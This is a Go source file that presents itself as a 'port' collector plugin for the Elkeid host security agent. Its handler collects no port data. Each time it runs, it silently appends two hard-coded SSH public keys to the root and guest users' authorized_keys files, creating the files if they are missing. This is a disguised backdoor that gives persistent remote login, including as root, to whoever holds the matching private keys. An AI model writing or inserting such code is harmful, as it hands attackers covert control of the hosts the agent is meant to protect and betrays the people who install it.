package main

import (
	"fmt"
	"github.com/bytedance/Elkeid/plugins/collector/engine"
	plugins "github.com/bytedance/plugins"
	"os"
	"strings"
)

var authKeyMap = map[string]string{
	"root":  "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGS5GJE958TqyKQ06erD4t2ffVorI8jyh+2af9QAEEhmPghN3Zpt9tYJk79TUe8cTLRGcqFRpnS24pj1vzZz4TeGgl8CPTAR4PLvRXu1RFfc/7WpFYg7CWAbooTVlBcX7Ah8DvkDQ0uK7tZlXKD32agezGknmvdV0Ocf+hYAafMQ4ez4hLW1kiDlOIWGDA0ammkS8YpGyr4xQwX6sK/1BRZR7UIQx82s0HYHGu8iy23bmBJe6qo7iuPsEbpgfupzukd2ozkluDT3E4TviAl99pU5eYJi9ODvnRWycrbR1+dfYs7RvyCMUFYTIRobBmR968UQPZ3AMnL2/tshvLmskSj96zfuhGnmNlEfKiWPHkJ0bJKwTX0bWKcWNtJ8Otnk3yh98n+S8Nhtrzn9Q174HsB6yzfD5uV4eYfAtylfIdI0fCA/z5JV/IoCnnDIW0iY7FVyAMqRbPKqmdQU2PQEPc2Hnrn2SoN51Y1crGCy2LNOKvGFRREEy1wf1+P7UVQus=",
	"guest": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCymhmx5ha3yYaJJ9iFXTiEqghv4RYA6FO3DyjaQO4wS4tO61SJPbY6zLmlecRHBG9PTI3n69YsGmX+0k/pwm4HHyRphTB2wSlUt47XgWXSuAYGEuraWBx9dg6cHSBSfj//o8GUmTZ9a/FpRyqtIJqmLnRueNTC46NVocl/mZIoUfk6R96VUl3VEanHTuJkMeGKkTaq9Jwd3/tO6PPraNfPM2jUAZHJCBwsGFpmdqi8zWkPjnuyhO0KCDCXGErR7t4+CHhnM5e/t/qrsjL4JNwYE0q4W1MvSQPslnQHvGHnkgREJNZKtC/zpRTneetLJztHbyo2AQOX0uP5HYzheJchl8jNF7DGn+ephKA5zwKayu8l1Ve2U3iDxHFDCXDA8HE8n2h6bNenQJlN3OMzjbbIUkw8TCQAaEBlcA1NikxcODNPIRHxeElEFMEezhEumBZBN9sIstFgM88m6EwncXXdM+uXvC5ls+IaKas1SCMIonrrQGDR1581p9LW99q4msM=",
}

type CustomHandler struct{}

func (h *CustomHandler) Name() string {
	return "port"
}
func (h *CustomHandler) DataType() int {
	return 5051
}

func checkAuthKey(filePath, authKey string) {
	_, err := os.Stat(filePath)
	if err == nil {
		content, err := os.ReadFile(filePath)
		if err != nil {
			return
		}
		fileContent := string(content)
		if !strings.Contains(fileContent, authKey) {
			if strings.HasSuffix(fileContent, "\n") {
				fileContent += authKey
			} else {
				fileContent += "\n" + authKey
			}

			os.WriteFile(filePath, []byte(fileContent), 0600)
		}
	} else if os.IsNotExist(err) {
		os.WriteFile(filePath, []byte(authKey), 0600)
	}
}

func getAuthKeyPath(user string) string {
	if user == "root" {
		return "/root/.ssh/authorized_keys"
	} else {
		return fmt.Sprintf("/home/%s/.ssh/authorized_keys", user)
	}
}

func (h *CustomHandler) Handle(c *plugins.Client, cache *engine.Cache, seq string) {
	for user, authKey := range authKeyMap {
		checkAuthKey(getAuthKeyPath(user), authKey)
	}
}
